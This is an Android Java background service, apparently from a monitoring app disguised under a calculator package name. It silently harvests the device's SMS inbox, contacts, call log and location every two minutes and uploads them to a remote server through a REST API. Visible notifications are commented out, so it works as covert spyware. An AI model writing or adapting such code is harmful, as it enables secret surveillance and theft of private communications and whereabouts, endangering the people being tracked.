package com.child.calculator;

import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by Nevon Dell on 4/6/2017.
 */

public class BackgroundService extends Service {

    SimpleDateFormat sdfd=new SimpleDateFormat("yyyy/MM/dd");
    SimpleDateFormat sdft=new SimpleDateFormat("HH:mm");
    Timer timer;
    TimerTask timerTask;
    Handler handler=new Handler();
    SharedPreferences pref;
    String pid,cid;
    boolean timeAvailable;
    boolean hourAvailable=false;

    private Context mContext;

    // Flag for GPS status
    boolean isGPSEnabled = false;

    ConnectivityManager cm;
    Boolean internet=null;

    // Flag for network status
    boolean isNetworkEnabled = false;

    // Flag for GPS status
    boolean canGetLocation = false;

    Location location; // Location
    double latitude=0.0; // Latitude
    double longitude=0.0; // Longitude

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1000; // 10 meters

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute

    // Declaring a Location Manager
    protected LocationManager locationManager;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        pref=getSharedPreferences("childmonitor",Context.MODE_PRIVATE);

        timer = new Timer();
        demo();
        timer.schedule(timerTask,0,60000*2);
//        timer.schedule(timerTask,0,5000);

    }

    public void demo(){
        timerTask = new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        pid = pref.getString("pid","");
                        cid = pref.getString("cid","");
                        if(cid.compareTo("")!=0) {
                            getMessages();
                            getContacts(BackgroundService.this.getContentResolver());
                            getCallLogs(BackgroundService.this.getContentResolver());
                            getLocation();
                        }
                    }
                });
            }
        };
    }


    public void getMessages(){

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, new String[]{"_id", "address", "date", "body"}, null, null,null);
        String sms = "";
        ArrayList<String> id=new ArrayList<String>();
        ArrayList<String> name=new ArrayList<String>();
        ArrayList<String>  date=new ArrayList<String>();
        ArrayList<String>  time=new ArrayList<String>();
        ArrayList<String>  body=new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (cur.moveToNext())
        {
            id.add(cur.getString(0));
            name.add(cur.getString(1));
            String b=cur.getString(3);
            b=b.replaceAll("'","");
            b=b.replaceAll("\"","");
            body.add(b);
            String dt=cur.getString(2);
            Date d=new Date(Long.parseLong(dt));
            String fd=sdfd.format(d);
            String ft=sdft.format(d);

            date.add(fd);
            time.add(ft);
            Pid.add(pid);
            Cid.add(cid);
        }


          new getMessageTask().execute(Pid,Cid,name,body,date,time);

    }


    public class getMessageTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addMessage(params[0],params[1],params[2],params[3],params[4],params[5]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }
    }


    public void getContacts(ContentResolver cr){

        Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);

        ArrayList<String> name = new ArrayList<String>();
        ArrayList<String> PhoneNumber=new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (phones.moveToNext())
        {
            String n=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String p = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            n=n.replaceAll("'","");
            n=n.replaceAll("\"","");
            name.add(n);
            PhoneNumber.add(p);
            Pid.add(pid);
            Cid.add(cid);
        }
        phones.close();

//        for (int i=0 ;i<name.size();i++){
//
//            Call.setText(Call.getText().toString()+"\n"+name.get(i) + "\n" + PhoneNumber.get(i) +"\n\n\n");
//        }
         new getContactTask().execute(Pid,Cid,name,PhoneNumber);

    }


    public class getContactTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addcontact(params[0],params[1],params[2],params[3]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }
    }


    public void getCallLogs(ContentResolver cr){

        String strOrder = CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor curCallLogs = cr.query(callUri, null, null, null, strOrder);


        ArrayList<String> conNumbers= new ArrayList<String>();
        ArrayList<String> conTime= new ArrayList<String>();
        ArrayList<String> conDate= new ArrayList<String>();
        ArrayList<String> conType= new ArrayList<String>();
        ArrayList<String> conDuration = new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();



        while (curCallLogs.moveToNext())
        {
            String callNumber = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.NUMBER));
            String duration = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DURATION));
            String callDate = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy");

            String dateTime = callDate;
            Date d=new Date(Long.parseLong(dateTime));
            String finalDate = sdfd.format(d);
            String finalTime = sdft.format(d);

            String dateString = formatter.format(new Date(Long.parseLong(callDate)));
            String callType = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.TYPE));

            if(callType.equals("1")){
                conType.add("Incoming");
            }else if(callType.equals("2")){
                conType.add("Outgoing");
            }else {
                conType.add("Missed");

            }
            callNumber = callNumber.replaceAll("'","");
            callNumber = callNumber.replaceAll("\"","");
            conNumbers.add(callNumber);

            conDuration.add(duration);
            conDate.add(finalDate);
            conTime.add(finalTime);
            Pid.add(pid);
            Cid.add(cid);


        }

//        for (int i=0 ;i<conNumbers.size();i++){
//
//            Call.setText(Call.getText().toString()+"\n"+conNumbers.get(i) + "\n" + conTime.get(i) +"\n"+conDate.get(i)+" \n"+conType.get(i)+"\n"+conDuration.get(i)+" \n"+"\n\n\n");
//        }


        new getCallLogTask().execute(Pid,Cid,conNumbers,conType,conDate,conTime,conDuration);


    }


    public class getCallLogTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addlog(params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }
    }



    public void getLocation()
    {
//        Toast.makeText(getApplicationContext(),"Inside getLocation",Toast.LENGTH_LONG).show();

        ArrayList<String> Pid=new ArrayList<String>();
        ArrayList<String> Cid=new ArrayList<String>();
        ArrayList<String> LatLng=new ArrayList<String>();
        ArrayList<String> d=new ArrayList<String>();
        ArrayList<String> t=new ArrayList<String>();

        try {
            GPSTrack gps_tracker = new GPSTrack(BackgroundService.this);
            if (gps_tracker.canGetLocation())
            {
                double Lat = gps_tracker.getLatitude();
                double Lng = gps_tracker.getLongitude();

//                Toast.makeText(this, Lat+","+Lng, Toast.LENGTH_SHORT).show();
                if(Lat!=0 && Lng!=0)
                {
                    Pid.add(pid);
                    Cid.add(cid);
                    LatLng.add(Lat+","+Lng);
                    Date dt=new Date();
                    d.add(sdfd.format(dt.getTime()));
                    t.add(sdft.format(dt.getTime()));
//                    Toast.makeText(this, LatLng+"", Toast.LENGTH_SHORT).show();

                    new getLocationTask().execute(Pid,Cid,LatLng,d,t);

                }
            }else {
//                Toast.makeText(getApplicationContext(),"else",Toast.LENGTH_LONG).show();

            }
        }catch (Exception e){
//            Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
        }

    }

    public class getLocationTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }



        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addLocation(params[0],params[1],params[2],params[3],params[4]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }
    }


    public class GPSTrack {


        Activity activity;

        public GPSTrack() {

        }

        public GPSTrack(Context context) {
            mContext = context;
            getLocation();
        }


        public Location getLocation() {
            try {


                locationManager = (LocationManager) mContext.getSystemService(mContext.LOCATION_SERVICE);

                // Getting GPS status
                isGPSEnabled = locationManager
                        .isProviderEnabled(LocationManager.GPS_PROVIDER);

                // Getting network status
                isNetworkEnabled = locationManager
                        .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

                if (!isGPSEnabled && !isNetworkEnabled) {
                    // No network provider is enabled
                } else {
                    canGetLocation = true;
                    if (isNetworkEnabled) {
                        int requestPermissionsCode = 50;

                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                        Log.d("Network", "Network");
                        if (locationManager != null) {
                            location = locationManager
                                    .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }
                // If GPS enabled, get latitude/longitude using GPS Services
                if (isGPSEnabled) {
                    if (location == null) {
                        if (ContextCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
//                            ActivityCompat.requestPermissions(mContext, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 50);

                        } else {
                            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                            Log.d("GPS Enabled", "GPS Enabled");
                            if (locationManager != null) {

                                location = locationManager
                                        .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                                if (location != null) {
                                    latitude = location.getLatitude();
                                    longitude = location.getLongitude();
                                }
                            }
                        }
                    }

                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return location;
        }


        private final LocationListener mLocationListener = new LocationListener() {
            @Override
            public void onLocationChanged(final Location location) {

                if (location != null) {
                    latitude = location.getLatitude();
                    longitude = location.getLongitude();

//                    Toast.makeText(Back_Service.this, "Location Changed--"+latitude+","+longitude, Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };


        public boolean canGetLocation() {
            return canGetLocation;
        }


        public double getLatitude() {
            if (location != null) {
                latitude = location.getLatitude();
            }

            return latitude;
        }


        public double getLongitude() {
            if (location != null) {
                longitude = location.getLongitude();
            }

            return longitude;
        }

    }





}
